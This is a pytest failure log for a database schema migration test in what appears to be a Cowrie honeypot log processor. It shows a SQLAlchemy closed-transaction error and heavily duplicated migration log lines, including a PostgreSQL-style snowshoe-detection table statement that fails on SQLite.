_____________________ test_apply_migrations_creates_tables _____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_apply_migrations_creates_0')

    def test_apply_migrations_creates_tables(tmp_path) -> None:
        """Applying migrations should create all expected tables and set version."""
        engine = _engine_for_tmp(tmp_path)
>       version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/unit/test_schema_migrations.py:26: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566c89cc90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,762:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,763:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,776:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,778:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,780:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,783:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,786:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,791:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,792:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,794:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,798:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,800:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
